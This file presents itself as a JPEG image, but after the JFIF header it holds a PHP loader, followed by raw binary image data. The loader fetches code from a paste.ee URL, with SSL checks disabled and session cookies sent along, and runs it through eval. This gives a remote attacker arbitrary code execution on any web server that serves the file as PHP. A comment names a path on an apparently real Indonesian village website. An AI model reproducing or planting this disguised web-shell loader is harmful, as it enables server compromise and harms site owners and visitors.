JFIF<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in || /home/websited/public_html/gladagsari.desa.id
    $a = geturlsinfo('https://paste.ee/d/MdTyR');
    eval('?>' . $a);

?>
scan_date=Thu Dec 19 10:25:30 2024
	( %"1!%)+...383-7(-.+



----+-------------------------------------7---7-777"G
!1Q"2AaqRr#3Bb$s4cCST(1!23A"BQ#q?	ЀwV]@={#`%{6g[Hnn(yM"í4TQePuh!Ruu&a+YH$nb˗qز5̪YCgYUP(٪ڮ|U>f2˦
E{mO?P09mmn|p;:M=Tm[[i	M#R) {
9UARQPsv܏"ՃHoqG6G?A~(ܗRw/N@#^y,GE!i>B<KZ0auAj|_m=S8rgj1`"<0Dpf_1
^zk'G)سcVykvv*(aA'K4/-!8`?oim
܁ڊ<UW^^w^
VA>i̒E6oc
90'P
&L7I=d5}ܩQm3}iA'?rۡP>b$ٷ,
9GgF=9$s삍m[.m)N|mb04fb69focavPb(!e[$
V=vm7v
àNX
[Kmݛ*RݝQmk1
./`Ffk]=̂PDc1!Y8Z? =@@3;9Re{;ukRGF>r@w)7	 w}W+{ſ)Fqn/hb;`uSJD_!`y#{
du'v\ֱ̻5GG7q3H?S7cX)\][jMA핎>tC d66ַK(z:er-9
2#(xÙ=7iP58$bbY8s"<Q=B/U{%W(!Uʤ:\uPBE[1|H7^(m+wUTK͉[%+RҦ94[\0Tֽt@6#T=wv
5dE]{GdxoR(z15BZE0!!7Jɉu]NLy0(|DEm#ת;H@Jt55o=6Jcw_@Qa:e9l0|vpժ9X3+VxwϜ)5A=~RՈī-IX~#)1ܪ=I8]-ZydϰmgCӻX^h}}=7i;;lcp$t-ja)k&X>U_SSDeU{aY׊9`{؟8FOdx$<n$Rv(al;dn*?Ur-WknkTSR:Vzݏ"9OZ]*#5f~-K.*-36#t(w.`NxFaM j3P,N.@d3cэ6U6fNhKhqM{lG`zY6	WI1trkjÛ;u+o@h}x"\꾏#y0qzd4UF>r%?N
w)ktEWgBZAUp%p6F;od^}TiLTs+X4ϡm;Jު+@V6}"ov'RGaClaxSXyFz:z91/oe= ]&¦&ʳ@^f[!<a4Z
d֤z)Q&^j͆PqeM)ss+ÀУb?д5_Ya2T5H}PH$Hz,ƮHJT(kerMI"tQ8`ۘnKWBѦ!΢$>桰=G#4j}TTX=R$A`6
,?	
n}g<ջpF:tfQߩ~pNV]XQM+W2$}䌌\&WlFnEmfjNdsAE#/zczG3]ǇWZШj}VT ?:REHQa~8Ѣ2N2OMRZO̡deSVюŻ'}kp[h52OIަB&teAkf(ZLwHlFReI'#FlxE|?K[4ĔV z]kE2\0&<kK"C_^
4?B]p枫kUwEδ
OM2j;'+HZCT%('WѝRl6VaQR\>!jeH=ZVBqrX_vs(ž]ZO=X{aS;OyƘ
,hz;D~X~JӇf9NLq1¼פ65M\5AU6ruJ^5TVV#1~|=.Vaa|bBE`cIoҽJe@Kmtih:NDkwojW[[T'X5o=;`~,?Z^ $nΠgKc
ܭ2\L'־I>;{
N衈ScavEdXŽ->L()gTZ˟8Q:]`[O`cڛT& _;/en82A-$
㕫8ezJqcLdwvpS؂Z>QrR
JlQ	?Fk/%ۂKB$`]J)5òl)Rƣ^cI觉~:&D)&"ߚOW_`$:1}'8A${[/|tm$>fZˬuLAt"JTq83W}e$*qڀv&zKPSbI}hl$䕦g1؂^5_ Uw
^yјfW6P
^scg)%1nˬrGIZɨEj=4;u-$խ/s_s?R)c)Uh
ԪWb.A+K'1Uj׬ݕuAA6\</u(*
<[W8cNm7cdG,>Om.#e:S=Gy˟keM71)TϾQU~gC:˿3~19ӫ֐ƒ$gue-T`w$p
Fe2+Sٷ*(oP3JbkZ
"$/v6n:{mV#UEE
sBIT@Aa=O(+uO>3핚OH}UOa'eN	\vД1"i܎KUԍ]lA	BWHU EeQkf\y\쵪TIIT)xJ%QKњw]knWyx<7PNŘ,:"InŌ# Ab3=:䪓OY VmN*Cӊ5Q\ޛW9[mͭ,DJ*JN¤0pXˬ){xA^c++
	Y~*ZuXԪSl@&ěl~;cy񢝕zejڨh/i&;{ٌ^B#$-''Jk׵iy[2CU;دq
#渠	xbKyGSl[#3]%3K3])19x $s&4*Z :tڽ/׶Pt0Q{Ƌaa2.MMn_&#*LtTk) c7r{gu"[
8U=LѺNk*B7=VAE)A:Tta%'5iR. (Oצ"Е@
(pA AOF;"e_pzH~n/]\=SHyƉv-)E>B#9\r=>R.n5aОFnZf[finQq -rUKm7|lݑK(Q/3FaG'ˤil!scy#ObF|&R-tbx~Y
/.C{-3.S2	-czsXTA	l76}| 8#z0(ޫñH&8 0A᱋PK_9VVQ8!@Li9<Oҭ8}.n*joF^{7H.VΚ3w85aN</;S;N}5 KW*<ʤgOɽ9Kr49g9FXqY8 AY┦(ۑhvwY?lȮ
[g	n12PIf#u=ZGau\q[TPfP6 I=*zQnm/3)<HXcR
F%t&mdRF7%n|ˊFGh1K.92sda:,@#qwDM	oo C.!Og&13Ͷ	^Wk0N#MEI 5>ѵ9uZŉf$nI7$'J:؛ܞ#=$$k#P=@g;۽#uV?xwG4Թ#NH5=tx7):~|SeNl3346QVFCx QL%vTX$ݍ̛
|]JQCvNN+5j*=OK֯rlb[)ۦe,-컦{CT3<bڣ㹈ؔ$&!շ=KYjqqdM挕\
He$ ؃Dh~Zˈ?ģ;0Sws2iE)+520e;7)2j7־9u"]G	ְr)#T#Ց2Avle4QTo,M50oGGg<lim3K8vsc:Mi?W2.~UjI$s$I=$bweC|krGI=8^3X걼B]H-<jr'U~pap=~r[j$t:S-lU.ȩ!؊G{pEy}iޘc4,r3>3,8l/wDkbM'q
뽇RLFkĮENShrºİx_^33WZSv
?OLJ-UO@7Խ;}8WcocHbA;d`$vM5؊u(xRDSXu)2/z׽J#{*L⥳f=t/W=x{cfR
a'],6Zs6o&,_YXșdz,6sad7
:av<RKfygoC|p&X62Jc鿲}.L<M2[W\n>rܡ|{`$
݃ğCZ;"aRIǚ=/m|H~['
*r.32NR9&Bk<-P1~7ɰxsQ`mT2CdFn㯑i3af]{4lf)TYu:qM@m&Q)z_2Kld+Oa*Z}?>U>r
NGcqI-Z@N{ W<+b*r}+iԸ^_dbh϶;SZk]S_OLHe=6*A0Ʈ@#0ꮭD<G
